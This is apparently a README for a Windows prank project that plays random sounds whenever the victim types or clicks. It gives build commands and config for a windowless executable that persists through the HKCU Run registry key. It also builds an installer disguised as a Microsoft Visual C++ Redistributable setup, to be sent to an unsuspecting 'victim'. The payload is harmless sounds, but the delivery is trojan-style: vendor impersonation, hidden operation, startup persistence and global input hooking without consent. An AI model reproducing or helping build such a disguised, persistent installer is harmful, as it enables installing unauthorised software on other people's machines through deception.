# Prank Template

Create your own prank with custom sounds. When the victim presses keys or clicks, random sounds play. The prank runs hidden (no window), starts with Windows, and sits in the system tray.

The included config is set up for GachiMuchi sounds. Swap the sounds, change the settings, and it's your prank.

---

## Quick Start

### 1. Add your sounds

Put `.mp3`, `.wav`, `.ogg`, `.flac`, or `.m4a` files into the `sounds/` folder.

The more sounds you add, the longer the victim stays confused.

### 2. Build test version

Run this to build `Prank_Test.exe` - it shows a console window so you can test:

```bash
pip install -r requirements.txt
pyinstaller --onefile --console --name Prank_Test src\main.py
```

Copy `Prank_Test.exe` to the project root, run it, and test that sounds play when you press keys.

### 3. Build hidden version (for the victim)

Once testing works, build the hidden version:

```bash
pyinstaller --onefile --windowed --name Prank src\main.py
```

### 4. Build the installer

The installer disguises itself as a fake software setup. Customize it first:

Edit `src/installer_config.json`:

```json
{
    "window_title": "Microsoft Visual C++ Redistributable Setup",
    "header_text": "Microsoft Visual C++ Redistributable",
    "version_text": "Version 14.42.2025",
    "install_folder": "WindowsCppRedist",
    "startup_name": "WindowsCppRedist",
    "exe_name": "Prank.exe",
    "finish_button_text": "Finish"
}
```

Then build:

```bash
pyinstaller --onefile --windowed --name Setup --add-data "Prank.exe;." --add-data "sounds;sounds" --add-data "config.json;." src\installer.py
```

The installer will:
- Copy `Prank.exe`, sounds, and config to `%ProgramData%\WindowsCppRedist\`
- Add itself to Windows startup (HKCU Run)
- Launch the prank
- Show "Installation complete"

### 5. Send `Setup.exe` to your victim

They run it, see a fake MSVC installer, and the prank starts.

---

## Customization

### Change which keys trigger sounds

Edit `hotkeys` in `config.json`:

```json
"hotkeys": ["space", "ctrl", "alt", "w", "a", "s", "d"]
```

### Make short sounds play more often

Add keywords to `priority_keywords`. Sounds with these words in their filename get `priority_weight`× higher chance:

```json
"priority_keywords": ["oh", "ah", "yeah", "fuck"],
"priority_weight": 3
```

### Change the app name (shown in tray)

```json
"app_name": "My Prank",
"tray_tooltip": "My Prank"
```

### Change startup registry key name

```json
"startup_name": "MyServiceName"
```

### Change the exit hotkey

```json
"exit_hotkey": "ctrl+alt+shift+f12"
```

Press `Ctrl+Alt+Shift+F12` to remove the prank from startup and exit.

### Disable mouse triggers

```json
"mouse_buttons": []
```

### Adjust cooldown (prevent sound spam)

```json
"cooldown_ms": 500
```

---

## File structure

```
gachi_prank/
├── src/
│   ├── main.py              # prank engine
│   └── installer.py          # fake setup installer
├── sounds/                   # YOUR SOUNDS GO HERE
├── config.json               # prank settings
├── installer_config.json     # installer appearance settings (created after first build)
├── remove_prank.bat          # cleanup script
├── requirements.txt
├── .gitignore
└── README.md
```

## Requirements

- Windows 10/11
- Python 3.10+

## License

MIT
